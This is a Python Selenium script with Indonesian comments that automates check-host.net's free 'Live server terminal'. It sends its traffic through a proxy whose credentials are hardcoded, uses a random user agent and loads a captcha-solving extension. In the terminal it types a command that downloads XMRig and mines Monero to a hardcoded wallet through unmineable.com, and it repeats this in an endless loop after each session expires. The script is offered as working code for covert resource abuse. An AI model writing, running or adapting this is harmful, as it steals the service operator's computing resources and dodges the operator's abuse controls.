import os
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from seleniumwire import webdriver
from fake_useragent import UserAgent
import time

# Proxy setup
proxy_host = "198.23.239.134"  # Ganti dengan host proxy
proxy_port = "6540"  # Ganti dengan port proxy
proxy_user = "asbmvrrx"  # Ganti dengan username proxy
proxy_pass = "ynx5tb7m6lcn"  # Ganti dengan password proxy

proxy = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

# Fake user-agent
ua = UserAgent()
user_agent = ua.random

# Selenium Wire options
options = {
    'proxy': {
        'http': proxy,
        'https': proxy,
        'no_proxy': 'localhost,127.0.0.1'  # Daftar domain yang tidak menggunakan proxy
    }
}

# File ekstensi (pastikan file ekstensi berada di direktori yang sama dengan kode)
extension_path = os.path.join(os.path.dirname(__file__), "hlifkpholllijblknnmbfagnkjneagid.crx")
captcha_ext_id = "hlifkpholllijblknnmbfagnkjneagid"

# Driver setup
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument(f"user-agent={user_agent}")
# chrome_options.add_argument("--headless")  # Hanya jika Anda ingin mode tanpa GUI
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")

# Tambahkan ekstensi ke driver
if os.path.exists(extension_path):
    chrome_options.add_extension(extension_path)
else:
    print(f"Ekstensi tidak ditemukan: {extension_path}")

# Loop untuk menjalankan proses berulang kali
while True:
    # Inisialisasi driver
    driver = webdriver.Chrome(seleniumwire_options=options, options=chrome_options)

    try:
        # Simpan handle tab awal
        original_window = driver.current_window_handle

        # Buka tab baru untuk mengakses popup ekstensi
        driver.execute_script("window.open('');")  # Membuka tab baru
        time.sleep(2)  # Tunggu sebentar agar tab baru terbuka

        # Berpindah ke tab baru
        new_tab = [tab for tab in driver.window_handles if tab != original_window][0]
        driver.switch_to.window(new_tab)

        # Akses popup ekstensi di tab baru
        driver.get(f'chrome-extension://{captcha_ext_id}/popup/popup.html')
        print(f"Berhasil membuka popup ekstensi di tab baru: chrome-extension://{captcha_ext_id}/popup/popup.html")
        time.sleep(5)

        # Kembali ke tab awal
        driver.switch_to.window(original_window)
        print("Berhasil kembali ke tab awal!")

        # Lanjutkan proses selanjutnya di tab awal
        driver.get("https://check-host.net")
        time.sleep(2)

        # Tunggu input pencarian untuk tersedia
        search_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "hostip"))
        )
        search_input.send_keys("google.com")  # Isi dengan nama domain

        # Tunggu tombol HTTP untuk tersedia dan klik
        http_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "input[name='http']"))
        )
        http_button.click()
        print("Berhasil mengisi pencarian dan mengklik tombol HTTP!")

        # Tunggu beberapa saat untuk hasil dimuat
        time.sleep(5)

        # Cari tombol "Live server terminal"
        terminal_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "terminal-show"))
        )
        terminal_button.click()
        print("Berhasil menekan tombol 'Live server terminal'!")

        # Tunggu iframe terminal muncul
        iframe_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "div#terminal-frame iframe"))
        )
        print("Iframe terminal ditemukan!")

        # Berpindah ke dalam iframe
        driver.switch_to.frame(iframe_element)
        print("Berhasil masuk ke dalam iframe terminal!")

        # Tunggu beberapa saat untuk elemen dalam iframe dimuat
        time.sleep(5)

        # Cek nilai ping sebelum klik tombol Debian
        while True:
            ping_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "ping-text"))
            )
            ping_value = ping_element.text.strip()
            print(f"Ping saat ini: {ping_value}")

            if ping_value != "..." and ping_value.isdigit():
                print("Ping berhasil diidentifikasi!")
                break
            print("Ping belum tersedia, menunggu 5 detik...")
            time.sleep(5)

        # Cari tombol Debian
        debian_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'debian')]"))
        )
        debian_button.click()
        print("Berhasil mengklik tombol 'Debian'!")

        # Tunggu elemen timer muncul dengan nilai
        while True:
            timer_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "timer"))
            )
            timer_value = timer_element.text.strip()
            if timer_value:  # Cek apakah nilai timer sudah tersedia
                print(f"Timer mulai menghitung mundur: {timer_value}")
                break
            print("Timer belum memiliki nilai, menunggu 5 detik...")
            time.sleep(5)

        # Cari elemen input untuk memasukkan teks ke terminal
        terminal_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "textarea.xterm-helper-textarea"))
        )
        terminal_input.send_keys("mkdir mymy && cd mymy && wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz && tar -xf xmrig-6.21.1-linux-x64.tar.gz && cd xmrig-6.21.1 && ./xmrig -a rx -o stratum+ssl://rx-eu.unmineable.com:443 -u XMR:88nwwZdT8SJAXunhysmJsYHTdFkvvhrZSARPXddvmHLrWw7bzF7XpRpVXUKt3cvnQAY41bJwYVi9a7CPMqHazH9FL81a7Rn.checkhost -p x")  # Masukkan teks lscpu
        terminal_input.send_keys(Keys.ENTER)  # Tekan Enter
        print("Berhasil memasukkan teks ke terminal dan menekan Enter!")

        # Tunggu timer mencapai 00.01, lalu tutup driver
        while True:
            timer_value = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "timer"))
            ).text.strip()
            print(f"Timer saat ini: {timer_value}")
            if timer_value == "00:01":
                print("Timer mencapai 00:01! Menutup driver...")
                break
            time.sleep(1)  # Periksa setiap detik

    finally:
        # Tutup driver
        driver.quit()
        print("Driver ditutup, memulai ulang proses...")
